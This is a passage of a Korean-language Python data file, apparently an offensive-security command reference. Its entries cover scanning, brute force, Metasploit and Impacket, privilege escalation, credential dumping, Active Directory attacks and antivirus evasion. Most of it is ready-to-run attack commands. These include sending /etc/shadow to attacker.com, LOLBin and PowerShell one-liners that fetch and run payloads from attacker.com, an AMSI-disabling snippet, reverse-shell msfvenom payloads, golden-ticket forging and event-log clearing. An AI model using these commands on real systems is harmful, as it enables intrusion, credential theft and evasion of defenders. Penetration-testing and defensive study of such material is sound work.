        "between(>=→BETWEEN), charencode(URL인코딩), charunicodeencode(유니코드), "
        "equaltolike(=→LIKE), versionedmorekeywords(MySQL인라인주석), "
        "space2dash(공백→--%0a). "
        "--level 5: Cookie/User-Agent 등도 테스트. "
        "--risk 3: 더 공격적인 페이로드(UPDATE 포함) - 주의"
    ),
},

"sec-tools-nmap": {
    "name": "Nmap 완전 레퍼런스",
    "module": "SecSkills-Tools",
    "tags": ["nmap", "port-scan", "service-detection", "vuln-script"],
    "desc": "Nmap: 스텔스 스캔→서비스 탐지→스크립트→방화벽 우회",
    "tools": ["nmap", "masscan"],
    "commands": [
        # 속도별 분류
        "nmap -sS -p- --min-rate 10000 -T4 target  # 초고속 전포트",
        "masscan -p1-65535 --rate=10000 target      # masscan 더 빠름",
        "nmap -sS -sV -p 21,22,80,443,3306,3389,8080 -T4 target  # 주요 포트",
        "nmap -sS -sV -sC -O -p- -T4 -oA nmap_full target  # 전체 스캔",
        # 방화벽 우회
        "nmap -sS -f target                    # 패킷 단편화",
        "nmap -sS -D RND:5 target              # 5개 랜덤 데코이",
        "nmap -sS --source-port 53 target      # DNS 포트 위장",
        "nmap -sS -T2 --scan-delay 5s target   # 느린 스캔",
        # 취약점 스크립트
        "nmap --script=vuln target             # 취약점 스캔",
        "nmap --script=smb-vuln* -p 445 target # SMB 취약점",
        "nmap --script=http-default-accounts -p 80,8080 target",
        "nmap --script=banner -p 21,22,80 target",
        "nmap --script=mysql-info,mysql-empty-password -p 3306 target",
    ],
    "payloads": [],
    "notes": (
        "SYN 스캔(-sS): 루트 필요, 탐지 어려움. TCP Connect(-sT): 루트 불필요. "
        "UDP 스캔(-sU): 느림, 포트 53/67/123/161 위주. "
        "스크립트 카테고리: default, safe, vuln, exploit, auth, brute. "
        "oA 옵션: .nmap, .xml, .gnmap 세 형식 동시 저장"
    ),
},

"sec-tools-fuzz": {
    "name": "퍼징 도구 완전 레퍼런스 (ffuf/gobuster/feroxbuster)",
    "module": "SecSkills-Tools",
    "tags": ["ffuf", "gobuster", "feroxbuster", "directory-brute", "param-fuzz"],
    "desc": "웹 퍼징 전체: 디렉토리→파라미터→VirtualHost→API 경로",
    "tools": ["ffuf", "gobuster", "feroxbuster", "dirsearch"],
    "commands": [
        # ffuf
        "ffuf -u https://target.com/FUZZ -w wordlist.txt -t 100",
        "ffuf -u https://target.com/FUZZ -w wordlist.txt -x php,asp,aspx,jsp,html -t 50",
        "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -t 50",
        "ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -H 'Authorization: Bearer xxx'",
        # VirtualHost 퍼징
        "ffuf -u https://target.com/ -H 'Host: FUZZ.target.com' -w subdomains.txt -fs 1234",
        # 파라미터 퍼징
        "ffuf -u https://target.com/page?FUZZ=1 -w params.txt",
        "ffuf -u https://target.com/page?id=FUZZ -w ids.txt -mr 'admin'",
        # gobuster
        "gobuster dir -u https://target.com -w directory-list-2.3-medium.txt -x php,html,bak -t 50",
        "gobuster vhost -u https://target.com -w subdomains.txt",
        # feroxbuster (재귀)
        "feroxbuster -u https://target.com -w wordlist.txt -x php,html -t 100 --depth 3",
        # 백업 파일 탐지
        "ffuf -u https://target.com/FUZZ -w backup-files.txt -mc 200",
    ],
    "payloads": [],
    "notes": (
        "필터: -mc(상태코드포함), -fc(제외), -ms(크기포함), -fs(제외), -mr(응답포함). "
        "백업 파일: index.php.bak, .git/HEAD, .env, web.config.bak. "
        "SecLists 경로: /usr/share/seclists/Discovery/Web-Content/. "
        "속도 조절: -rate 또는 -t로 스레드 제한 (WAF 있으면 낮게)"
    ),
},

"sec-tools-hydra": {
    "name": "Hydra/Medusa 브루트포스 레퍼런스",
    "module": "SecSkills-Tools",
    "tags": ["hydra", "brute-force", "password-spray", "credential"],
    "desc": "Hydra/Medusa: SSH/FTP/HTTP/MySQL/RDP/SMB 브루트포스",
    "tools": ["hydra", "medusa", "crackmapexec"],
    "commands": [
        # SSH
        "hydra -l root -P rockyou.txt ssh://target",
        "hydra -L users.txt -P pass.txt -t 4 ssh://target  # 4스레드",
        # HTTP POST 폼
        "hydra -l admin -P pass.txt target http-post-form '/login.php:user=^USER^&pass=^PASS^:Login failed'",
        "hydra -L users.txt -P pass.txt target http-post-form '/login:id=^USER^&pw=^PASS^:F=비밀번호가 틀렸습니다'",
        # MySQL
        "hydra -l root -P pass.txt mysql://target",
        # RDP
        "hydra -l administrator -P pass.txt rdp://target",
        # SMB
        "hydra -l administrator -P pass.txt smb://target",
        # Medusa
        "medusa -h target -u root -P pass.txt -M ssh",
        # CrackMapExec 스프레이
        "crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!'",
        "crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH'",
    ],
    "payloads": [],
    "notes": (
        "주요 옵션: -t(스레드수), -f(첫 성공시 중단), -e ns(빈 비밀번호+사용자=비밀번호). "
        "HTTP 형식: 'URL:POST_데이터:실패_문자열'. "
        "실패 문자열 F= vs 성공 문자열 S= 구분. "
        "패스워드 스프레이: 계정 잠금 피하려면 1개 비밀번호로 전체 계정 시도"
    ),
},

"sec-tools-metasploit": {
    "name": "Metasploit Framework 레퍼런스",
    "module": "SecSkills-Tools",
    "tags": ["metasploit", "msfvenom", "meterpreter", "exploit"],
    "desc": "MSF: 모듈 사용→페이로드 생성→Meterpreter→후속작업",
    "tools": ["metasploit", "msfvenom", "msfconsole"],
    "commands": [
        # 기본 워크플로우
        "msfconsole -q",
        "search eternalblue",
        "use exploit/windows/smb/ms17_010_eternalblue",
        "set RHOSTS target; set LHOST attacker; run",
        # 페이로드 생성
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f elf -o shell.elf",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o shell.exe",
        "msfvenom -p php/meterpreter_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw > shell.php",
        # 면역회피 인코딩
        "msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe",
        # Meterpreter 핵심
        "meterpreter > getsystem           # 권한 상승",
        "meterpreter > hashdump            # 해시 덤프",
        "meterpreter > run post/multi/recon/local_exploit_suggester  # 권한상승 제안",
        "meterpreter > portfwd add -l 3306 -p 3306 -r 192.168.1.10  # 포트포워딩",
        "meterpreter > upload /local/path /remote/path",
        "meterpreter > screenshot",
        "meterpreter > migrate [PID]       # 프로세스 이전",
        "meterpreter > clearev             # 이벤트 로그 삭제",
    ],
    "payloads": [],
    "notes": (
        "MSF 리스너: use multi/handler → set PAYLOAD → set LHOST → run. "
        "Shikata_ga_nai: 다형성 인코더 (반복 횟수 높을수록 탐지 어려움). "
        "권한 상승: getsystem 실패시 local_exploit_suggester 사용. "
        "스텔스: migrate로 안전한 프로세스(explorer.exe)로 이전"
    ),
},

"sec-tools-impacket": {
    "name": "Impacket 도구 레퍼런스",
    "module": "SecSkills-Tools",
    "tags": ["impacket", "pth", "dcsync", "secretsdump", "lateral"],
    "desc": "Impacket: PTH→DCSync→Kerberoast→AS-REP→WMI/SMB 원격 실행",
    "tools": ["impacket"],
    "commands": [
        # Pass-the-Hash
        "psexec.py domain/Administrator@target -hashes :NTLM_HASH",
        "wmiexec.py domain/Administrator@target -hashes :NTLM_HASH 'whoami'",
        "smbexec.py domain/Administrator@target -hashes :NTLM_HASH",
        "atexec.py -hashes :NTLM_HASH domain/Administrator@target 'whoami'",
        # DCSync
        "secretsdump.py domain/Administrator:Pass@DC_IP",
        "secretsdump.py domain/Administrator@DC_IP -hashes :HASH",
        "secretsdump.py domain/Administrator@DC_IP -just-dc-user krbtgt",
        # Kerberoasting
        "GetUserSPNs.py domain/user:pass@dc -request -outputfile hashes.txt",
        "GetNPUsers.py domain/ -usersfile users.txt -outputfile asrep.txt  # AS-REP",
        # 티켓
        "getTGT.py domain/user -hashes :NTLM_HASH",
        "export KRB5CCNAME=user.ccache",
        "secretsdump.py -k -no-pass user@DC.domain",
    ],
    "payloads": [],
    "notes": (
        "psexec: SMB 445 포트, 서비스 생성 → 로그 남음. "
        "wmiexec: WMI 135 포트, 덜 탐지됨. "
        "smbexec: 서비스 생성하지 않아 더 은밀. "
        "DCSync: DS-Replication 권한 필요 (도메인관리자 이상). "
        "KRB5CCNAME으로 티켓 경로 지정 후 -k -no-pass 옵션"
    ),
},

# ══════════════════════════════════════════════════════════════
# SecSkills-main — 정찰/OSINT
# ══════════════════════════════════════════════════════════════

"sec-info-osint": {
    "name": "OSINT/정보수집 완전 레퍼런스",
    "module": "SecSkills-Recon",
    "tags": ["osint", "google-dork", "shodan", "fofa", "whois", "github"],
    "desc": "OSINT: Google Hacking→Shodan→FOFA→WHOIS→GitHub 유출→이메일 수집",
    "tools": ["theHarvester", "shodan", "recon-ng", "maltego"],
    "commands": [
        # Google Dork
        "site:target.com filetype:sql",
        "site:target.com filetype:env",
        "site:target.com inurl:admin",
        "site:target.com intitle:'index of'",
        "site:*.target.com -www -mail",
        "site:github.com target.com password",
        "site:pastebin.com target.com",
        # Shodan
        "shodan search 'hostname:target.com' --fields ip_str,port,org",
        "shodan domain target.com",
        "shodan host 1.2.3.4",
        "shodan search 'ssl.cert.subject.cn:target.com'",
        # FOFA
        'domain="target.com"',
        'host="target.com" && country="KR"',
        'cert="target.com"',
        # theHarvester
        "theHarvester -d target.com -b all -l 500",
        "theHarvester -d target.com -b google,linkedin,github -l 200",
        # GitHub 검색
        "org:target api_key OR password OR secret OR credential",
        "target.com password language:python",
    ],
    "payloads": [],
    "notes": (
        "Google Dork: site:, inurl:, intitle:, filetype:, intext:, ext:, ext:bak. "
        "Shodan: hostname, org, ssl, port, city, vuln 등 필터. "
        "GitHub 유출 확인: trufflehog/gitleaks로 전체 이력 스캔. "
        "이메일 패턴: hunter.io에서 도메인 입력시 패턴 확인. "
        "Wayback Machine: 과거 소스코드에 남겨진 API 키 탐색"
    ),
},

"sec-info-fingerprint": {
    "name": "웹 지문인식(Fingerprinting) 레퍼런스",
    "module": "SecSkills-Recon",
    "tags": ["fingerprint", "wappalyzer", "whatweb", "cms", "waf"],
    "desc": "기술스택 지문인식: CMS/프레임워크/서버/WAF/CDN 식별",
    "tools": ["whatweb", "wappalyzer", "httpx", "wafw00f"],
    "commands": [
        "whatweb -a 3 https://target.com",
        "httpx -u https://target.com -tech-detect -status-code -title",
        "wafw00f https://target.com",
        "curl -I https://target.com | grep -i 'server\\|x-powered-by\\|set-cookie'",
        # 특징 경로 확인
        "# WordPress: /wp-admin/, /wp-login.php, /wp-content/",
        "# Drupal: /user/login, /sites/default/",
        "# Joomla: /administrator/",
        "# DedeCMS: /dede/, /plus/, /templets/",
        "# phpMyAdmin: /phpmyadmin/, /pma/",
        "# Tomcat: /manager/html",
        # Favicon Hash (Shodan)
        "curl -s https://target.com/favicon.ico | md5sum  # hash로 Shodan 검색",
    ],
    "payloads": [],
    "notes": (
        "HTTP 헤더: Server(서버종류), X-Powered-By(언어/프레임워크), "
        "Set-Cookie(PHPSESSID=PHP, JSESSIONID=Java, ASP.NET_SessionId=.NET). "
        "Favicon Hash: Shodan에서 icon_hash로 같은 CMS 인스턴스 탐색. "
        "robots.txt, sitemap.xml, /readme.txt에서 버전 정보 노출 빈번"
    ),
},

"sec-info-subdomain": {
    "name": "서브도메인 열거 레퍼런스",
    "module": "SecSkills-Recon",
    "tags": ["subdomain", "amass", "subfinder", "crt-sh", "dns"],
    "desc": "서브도메인 열거: 인증서투명성→DNS→브루트포스→Shodan→Zone Transfer",
    "tools": ["subfinder", "amass", "dnsx", "httpx"],
    "commands": [
        # 패시브
        "subfinder -d target.com -all -recursive -o subdomains.txt",
        "amass enum -passive -d target.com -o subdomains.txt",
        "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sort -u",
        # 액티브
        "amass enum -active -brute -d target.com -w wordlist.txt",
        "dnsx -d target.com -a -cname -mx -ns -txt",
        # Zone Transfer
        "dig axfr @ns1.target.com target.com",
        "dnsrecon -d target.com -t axfr",
        # 살아있는 서브도메인 확인
        "cat subdomains.txt | httpx -status-code -title -tech-detect",
        "cat subdomains.txt | httpx -silent | tee alive_subs.txt",
        # 와일드카드 확인
        "dig random123xyz.target.com  # 응답 있으면 와일드카드",
    ],
    "payloads": [],
    "notes": (
        "crt.sh: 인증서 투명성 로그 - 무료 서브도메인 발견. "
        "Zone Transfer: 허용되면 전체 DNS 레코드 노출 (취약!). "
        "와일드카드: 브루트포스 결과 정제시 제거 필요. "
        "서브도메인 탈취: 삭제된 클라우드 리소스의 CNAME이 살아있으면 탈취 가능"
    ),
},

"sec-info-dirbust": {
    "name": "디렉토리/파일 브루트포스 레퍼런스",
    "module": "SecSkills-Recon",
    "tags": ["dirbust", "gobuster", "ffuf", "backup-file", "git-leak"],
    "desc": "디렉토리 브루트포스: 워드리스트→백업파일→Git유출→민감파일 탐색",
    "tools": ["gobuster", "ffuf", "feroxbuster", "dirsearch"],
    "commands": [
        "gobuster dir -u https://target.com -w directory-list-2.3-medium.txt -x php,asp,aspx,bak,zip,txt -t 50",
        "ffuf -u https://target.com/FUZZ -w raft-large-directories.txt -mc 200,301,302,403 -t 100",
        "feroxbuster -u https://target.com -w wordlist.txt -x php,html,bak -t 100 --depth 3",
        # 백업 파일
        "ffuf -u https://target.com/FUZZ -w backup-files.txt -mc 200",
        # Git 유출
        "curl https://target.com/.git/HEAD  # 'ref:' 포함시 Git 노출",
        "git-dumper https://target.com/.git/ ./output/",
        # 고가치 파일
        "curl https://target.com/.env",
        "curl https://target.com/phpinfo.php",
        "curl https://target.com/web.config",
        "curl https://target.com/backup.zip",
        "curl https://target.com/composer.json",
    ],
    "payloads": [],
    "notes": (
        "고가치 파일: .env, .git/HEAD, web.config, phpinfo.php, backup.zip, "
        "database.sql, config.php.bak, .DS_Store. "
        ".htaccess/.htpasswd 노출 시 인증 우회 가능. "
        ".git 노출: git-dumper로 전체 소스코드 복원 가능. "
        "DS_Store: 디렉토리 구조 노출"
    ),
},

"sec-post-linux-privesc": {
    "name": "Linux 권한 상승 완전 레퍼런스",
    "module": "SecSkills-PostExploit",
    "tags": ["linux-privesc", "suid", "sudo", "cron", "kernel", "linpeas"],
    "desc": "Linux 권한상승: SUID→Sudo→Cron→커널CVE→Capabilities→서비스",
    "tools": ["linpeas", "pspy", "searchsploit"],
    "commands": [
        # 일괄 정보수집
        "id; whoami; uname -a; cat /etc/*release; sudo -l",
        "find / -perm -4000 -type f 2>/dev/null  # SUID",
        "getcap -r / 2>/dev/null  # Capabilities",
        "crontab -l; cat /etc/crontab",
        "ps aux | grep -v grep",
        # LinPEAS
        "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        # SUID 이용
        "find . -exec /bin/sh -p \\; -quit  # SUID find",
        "python3 -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")'  # SUID python",
        "awk 'BEGIN {system(\"/bin/sh\")}' # SUID awk",
        # Sudo 이용
        "sudo find . -exec /bin/sh \\; -quit",
        "sudo vim -c ':!/bin/sh'",
        "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
        "sudo wget --post-file=/etc/shadow http://attacker.com/",
        # Cron 파일 쓰기 권한
        "echo 'cp /bin/sh /tmp/sh; chmod u+s /tmp/sh' >> /etc/cron.hourly/backup.sh",
        # 커널 CVE
        "CVE-2021-4034 PwnKit: pkexec 권한상승",
        "CVE-2022-0847 DirtyPipe: Linux 5.8-5.16.11 파일 덮어쓰기",
        "CVE-2016-5195 DirtyCow: 2.6.22-4.8.3",
    ],
    "payloads": [],
    "notes": (
        "GTFObins(https://gtfobins.github.io): SUID/Sudo 이진 파일 이용법 데이터베이스. "
        "Cron 통해 Tar 와일드카드 인젝션: --checkpoint-action=exec. "
        "Capabilities cap_setuid=ep: python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'. "
        "PwnKit(CVE-2021-4034): pkexec 거의 모든 배포판 기본 설치"
    ),
},

"sec-post-win-privesc": {
    "name": "Windows 권한 상승 완전 레퍼런스",
    "module": "SecSkills-PostExploit",
    "tags": ["windows-privesc", "alwaysinstallelevated", "uac", "token", "winpeas"],
    "desc": "Windows 권한상승: UAC우회→AlwaysInstallElevated→서비스→토큰→WinPEAS",
    "tools": ["winpeas", "powerup", "printspoofer", "juicypotato"],
    "commands": [
        # 자동 정보수집
        ".\\winPEAS.exe",
        "powershell -ep bypass -c 'Import-Module .\\PowerUp.ps1; Invoke-AllChecks'",
        # AlwaysInstallElevated
        "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        # 서비스 이용
        "sc qc [ServiceName]  # 서비스 경로 확인",
        "icacls [ServicePath]  # 쓰기 권한 확인",
        # Potato 계열 (SeImpersonatePrivilege)
        ".\\PrintSpoofer.exe -i -c cmd  # Windows Server 2019+",
        ".\\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {클래스ID}  # Win10 이전",
        ".\\SweetPotato.exe -a 'whoami'",
        # 토큰
        "whoami /priv",
        # 레지스트리 autorun
        "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        # 패스워드 파일 검색
        'findstr /si password C:\\Windows\\Panther\\Unattend.xml',
        'findstr /si password C:\\*.xml C:\\*.ini C:\\*.txt',
    ],
    "payloads": [],
    "notes": (
        "SeImpersonatePrivilege: 서비스 계정에 있으면 Potato로 SYSTEM 가능. "
        "Unquoted Service Path: 쓰기 가능한 경로에 악성 EXE 배치. "
        "AlwaysInstallElevated: 두 레지스트리 모두 1이면 MSI로 SYSTEM 가능. "
        "Watson: 패치된 버전 기반 로컬 권한상승 취약점 자동 탐지"
    ),
},

"sec-post-credentials": {
    "name": "자격증명 탈취 완전 레퍼런스",
    "module": "SecSkills-PostExploit",
    "tags": ["credentials", "mimikatz", "secretsdump", "hash", "lsass"],
    "desc": "자격증명 탈취: Mimikatz→LSASS덤프→SAM→브라우저→설정파일→해시크래킹",
    "tools": ["mimikatz", "pypykatz", "lazagne", "hashcat"],
    "commands": [
        # Mimikatz
        "privilege::debug",
        "sekurlsa::logonpasswords          # ★ 핵심 - 명문 비밀번호/NTLM",
        "lsadump::sam                      # SAM 데이터베이스",
        "lsadump::secrets",
        "sekurlsa::tickets /export         # Kerberos 티켓",
        # LSASS 덤프 (Mimikatz 없이)
        "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
        "pypykatz lsa minidump lsass.dmp  # Linux에서 분석",
        # SAM 레지스트리
        "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive",
        "secretsdump.py -sam sam.hive -system system.hive LOCAL",
        # Linux 자격증명
        "cat /etc/shadow",
        "cat ~/.bash_history | grep -i pass",
        "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -E 'PASS|SECRET'",
        "grep -rn 'password' /var/www/ 2>/dev/null",
        # 해시 크래킹
        "hashcat -m 1000 ntlm.txt rockyou.txt  # NTLM",
        "hashcat -m 5600 netntlmv2.txt rockyou.txt  # NetNTLMv2",
        "john --wordlist=rockyou.txt --format=NT ntlm.txt",
    ],
    "payloads": [],
    "notes": (
        "Mimikatz 면역회피: procdump+오프라인분석, 반사적 로딩, pypykatz. "
        "LSASS 보호: RunAsPPL=1 설정시 직접 덤프 방지 (우회법 있음). "
        "Linux Shadow: $6$(SHA-512), $5$(SHA-256), $1$(MD5). "
        "LaZagne: 브라우저/Wi-Fi/메일/DB/SSH 모든 저장된 비밀번호 한번에"
    ),
},

"sec-post-ad": {
    "name": "Active Directory 공격 완전 레퍼런스",
    "module": "SecSkills-PostExploit",
    "tags": ["active-directory", "bloodhound", "kerberoast", "dcsync", "golden-ticket"],
    "desc": "AD 공격: BloodHound→Kerberoasting→AS-REP→DCSync→Golden/Silver Ticket",
    "tools": ["bloodhound", "impacket", "rubeus", "mimikatz"],
    "commands": [
        # BloodHound 데이터 수집
        "SharpHound.exe -c All --zipfilename bloodhound.zip",
        # Kerberoasting
        "GetUserSPNs.py domain/user:pass@dc -request -outputfile hashes.txt",
        "Rubeus.exe kerberoast /outfile:hashes.txt",
        "hashcat -m 13100 hashes.txt rockyou.txt",
        # AS-REP Roasting
        "GetNPUsers.py domain/ -usersfile users.txt -outputfile asrep.txt",
        "hashcat -m 18200 asrep.txt rockyou.txt",
        # DCSync
        "secretsdump.py domain/Admin:Pass@DC",
        "mimikatz lsadump::dcsync /domain:domain.local /user:krbtgt",
        # Golden Ticket
        "mimikatz kerberos::golden /domain:domain.local /sid:S-1-5-21-X /krbtgt:HASH /user:Administrator /ptt",
        # 횡적 이동
        "crackmapexec smb 192.168.1.0/24 -u Administrator -H 'HASH' --local-auth",
        "crackmapexec smb 192.168.1.0/24 -u Administrator -H 'HASH' -x 'whoami'",
    ],
    "payloads": [],
    "notes": (
        "Kerberoasting: SPN 등록된 서비스 계정 → TGS → 오프라인 크랙. "
        "AS-REP: 사전인증 비활성화 계정 → AS-REP → 오프라인 크랙. "
        "DCSync: DC에서 직접 해시 추출 (도메인관리자 권한 필요). "
        "Golden Ticket: krbtgt 해시로 10년짜리 TGT 생성 → 완전한 도메인 장악. "
        "Silver Ticket: 서비스 계정 해시로 특정 서비스 TGS 위조"
    ),
},

"sec-evasion-shellcode": {
    "name": "셸코드 난독화 / AV 면역회피",
    "module": "SecSkills-Evasion",
    "tags": ["shellcode", "av-evasion", "obfuscation", "msfvenom", "amsi"],
    "desc": "셸코드 생성→XOR암호화→분할로딩→C로더→AMSI우회→EDR회피",
    "tools": ["msfvenom", "veil", "cobalt-strike"],
    "commands": [
        # msfvenom 생성
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o shell.exe",
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f c  # C 배열",
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f elf -o shell.elf",
        "msfvenom -p windows/x64/shell_reverse_tcp ... -f raw | base64",
        # 인코딩
        "msfvenom ... -e x86/shikata_ga_nai -i 10 -f exe  # 다형성 인코딩",
        # AMSI 우회 (PowerShell)
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        # 메모리 인젝션
        "msfvenom ... -f raw > sc.bin && python3 inject.py sc.bin [PID]",
    ],
    "payloads": [
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=4444 -f c",
        "XOR 키로 셸코드 암호화 후 런타임 복호화 로더",
    ],
    "notes": (
        "면역회피 계층: 시그니처(패커/인코더) → 행위(샌드박스감지) → 메모리(인젝션). "
        "AMSI: powershell/csharp에서 스캔 → 비활성화 후 실행. "
        "ETW: EtwEventWrite 패치로 이벤트 로깅 비활성화. "
        "인메모리 실행: 파일 없이 메모리에서만 실행 (디스크 포렌식 회피)"
    ),
},

"sec-host-brute": {
    "name": "비밀번호 공격 / 해시크래킹 레퍼런스",
    "module": "SecSkills-Recon",
    "tags": ["brute-force", "password-spray", "hashcat", "john"],
    "desc": "비밀번호 공격: Hydra→Hashcat→John→자격증명 스터핑→스프레이",
    "tools": ["hydra", "hashcat", "john", "crackmapexec"],
    "commands": [
        # Hydra
        "hydra -l admin -P rockyou.txt target http-post-form '/login.php:user=^USER^&pass=^PASS^:Login failed'",
        "hydra -L users.txt -P pass.txt ssh://target -t 4",
        # Hashcat
        "hashcat -m 1000 ntlm.txt rockyou.txt              # NTLM",
        "hashcat -m 5600 netntlmv2.txt rockyou.txt         # NetNTLMv2",
        "hashcat -m 13100 krb5.txt rockyou.txt             # Kerberos TGS",
        "hashcat -m 1800 sha512.txt rockyou.txt            # Linux SHA-512",
        "hashcat -m 1000 -a 3 ntlm.txt ?l?l?l?l?d?d?d?d   # 마스크 공격",
        "hashcat -m 1000 -a 0 -r best64.rule ntlm.txt rockyou.txt  # 규칙 적용",
        # John
        "unshadow /etc/passwd /etc/shadow > hashes.txt",
        "john --wordlist=rockyou.txt hashes.txt",
        "john --show hashes.txt",
        # CrackMapExec 스프레이
        "crackmapexec smb target -u users.txt -p 'Welcome1!'  # 스프레이",
    ],
    "payloads": [],
    "notes": (
        "Hashcat 모드: 0(MD5), 100(SHA1), 1000(NTLM), 1800(SHA512crypt), "
        "5600(NetNTLMv2), 13100(Kerberos TGS), 18200(AS-REP). "
        "공격 모드: -a0(사전), -a1(조합), -a3(마스크/브루트), -a6(혼합). "
        "패스워드 스프레이: 계정 잠금 정책 확인 후 시도 (보통 5회 시도). "
        "RockYou2024.txt: 100억개 이상의 실제 유출 비밀번호"
    ),
},

# ══════════════════════════════════════════════════════════════
# advsec-plus — 고급 보안 레퍼런스
# ══════════════════════════════════════════════════════════════

"advsec-api-security": {
    "name": "API 보안 고급 레퍼런스",
    "module": "AdvSec-Plus",
    "tags": ["api", "jwt", "oauth", "bola", "mass-assignment", "rate-limit"],
    "desc": "API 보안: BOLA/IDOR→Mass Assignment→인증→속도제한→GraphQL",
    "tools": ["burpsuite", "postman", "jwt_tool"],
    "commands": [
        # BOLA (Broken Object Level Authorization)
        "GET /api/v1/users/1234  → /api/v1/users/1235  # 숫자 순열",
        "GET /api/orders/abc-uuid → 다른 UUID 시도",
        # Mass Assignment
        "POST /api/users {\"username\":\"test\",\"password\":\"123\",\"role\":\"admin\"}",
        "PATCH /api/profile {\"balance\":9999999}",
        # JWT 공격
        "python3 jwt_tool.py TOKEN -T",
        "python3 jwt_tool.py TOKEN -X a  # alg:none",
        # API 키 노출 탐지
        "grep -rn 'apikey\\|api_key\\|authorization\\|bearer' *.js",
        # API 엔드포인트 발견
        "ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt",
        "linkfinder -i https://target.com -o cli  # JS에서 엔드포인트 추출",
    ],
    "payloads": [
        "GET /api/users/{victim_id}/profile",
        'PATCH /api/profile {"role":"admin","isAdmin":true}',
    ],
    "notes": (
        "OWASP API Top 10: BOLA, Authentication, Object Property Auth, "
        "Unrestricted Resource Consumption, BFLA, Unrestricted Business Flow, "
        "SSRF, Misconfiguration, Improper Inventory, Unsafe API Consumption. "
        "GraphQL: 인트로스펙션 → 스키마 노출 → 민감 필드 직접 쿼리"
    ),
},

"advsec-cloud-security": {
    "name": "클라우드 보안 고급 레퍼런스",
    "module": "AdvSec-Plus",
    "tags": ["aws", "azure", "gcp", "iam", "s3", "metadata"],
    "desc": "클라우드 보안: AWS메타데이터→IAM권한열거→S3공개→Pacu→Prowler",
    "tools": ["pacu", "prowler", "awscli", "enumerate-iam"],
    "commands": [
        # AWS 메타데이터 SSRF
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        # IAM 권한 열거
        "aws sts get-caller-identity",
        "python3 enumerate-iam.py --access-key AKIA... --secret-key xxx",
        # S3 버킷
        "aws s3 ls s3://bucket-name --no-sign-request  # 공개 버킷",
        "aws s3 cp s3://bucket-name/ . --recursive --no-sign-request",
        "python3 s3scanner.py --buckets-file targets.txt",
        # 감사
        "prowler aws -c check11,check21  # CIS Benchmark",
        "scout-suite -p aws",
        # Pacu (공격 프레임워크)
        "pacu  # set_keys → run iam__enum_permissions",
        # GCP
        "curl http://metadata.google.internal/computeMetadata/v1/instance/ -H 'Metadata-Flavor: Google'",
    ],
    "payloads": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/ (GCP)",
    ],
    "notes": (
        "AWS IMDSv1: GET만으로 접근. IMDSv2: PUT 토큰 요청 필요. "
        "탈취된 AWS 키 즉시 비활성화: aws iam delete-access-key. "
        "S3 네이밍 패턴: company-backup, company-logs, company-data. "
        "Lambda 환경변수: aws lambda get-function-configuration으로 비밀 확인"
    ),
},

"advsec-evasion-advanced": {
    "name": "고급 탐지 우회 기법",
    "module": "AdvSec-Plus",
    "tags": ["evasion", "amsi", "edr", "lolbins", "fileless"],
    "desc": "고급 우회: AMSI패치→ETW비활성화→LOLBins→파일리스→EDR API훅해제",
    "tools": ["cobalt-strike", "sliver", "havoc"],
    "commands": [
        # AMSI 우회
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        # LOLBins
        "certutil -decode payload.b64 payload.exe",
        "mshta.exe http://attacker.com/payload.hta",
        "regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll",
        "wscript.exe //b //e:JScript http://attacker.com/payload.js",
        "bitsadmin /transfer job http://attacker.com/payload.exe %TEMP%\\payload.exe",
        # 파일리스 PowerShell
        "powershell -nop -w hidden -enc [Base64EncodedPayload]",
        "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
        # Process Injection
        "meterpreter > migrate [PID]  # 합법 프로세스로 이전",
        # C2 프레임워크
        "Sliver: ./sliver-server generate -N implant -l https://attacker.com:443",
    ],
    "payloads": [
        "powershell -nop -w hidden -enc [base64]",
        "certutil -urlcache -f http://attacker.com/shell.exe shell.exe",
    ],
    "notes": (
        "LOLBAS(https://lolbas-project.github.io): Windows 시스템 바이너리 이용법. "
        "GTFObins(https://gtfobins.github.io): Linux 시스템 바이너리 이용법. "
        "파일리스: 메모리에만 존재, 디스크 포렌식 회피. "
        "EDR 우회: syscall 직접 호출(NTAPI), DLL 언로딩, 프로세스 할로잉"
